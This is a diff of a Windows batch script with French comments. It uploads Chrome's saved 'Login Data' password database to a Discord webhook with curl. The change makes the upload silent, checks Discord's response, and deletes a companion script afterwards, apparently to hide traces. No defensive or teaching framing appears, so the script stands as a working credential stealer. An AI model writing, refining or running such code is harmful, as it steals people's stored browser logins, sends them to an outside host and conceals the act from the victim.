@@ -4,12 +4,17 @@ set "webhook_url=https://discord.com/api/webhooks/1177006144699506749/JBM_hoiJAR
 set "chrome_login_data=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
 REM Utilisation de l'option --data-binary pour envoyer le fichier directement
-curl -X POST --data-binary "@%chrome_login_data%" %webhook_url%
+curl -s -X POST --data-binary "@%chrome_login_data%" %webhook_url% > response.json
 
-if %errorlevel% neq 0 (
-    echo Failed to send file to Discord.
+for /f "tokens=* delims=" %%a in (response.json) do set "response=%%a"
+
+del response.json
+
+if /I "%response%"=="{"message": "Cannot send an empty message", "code": 50006}" (
+    echo Failed to send file to Discord. Empty message error.
 ) else (
     echo File sent successfully to Discord.
 )
 
-pause
+REM Supprime le script secondaire
+del script2.bat
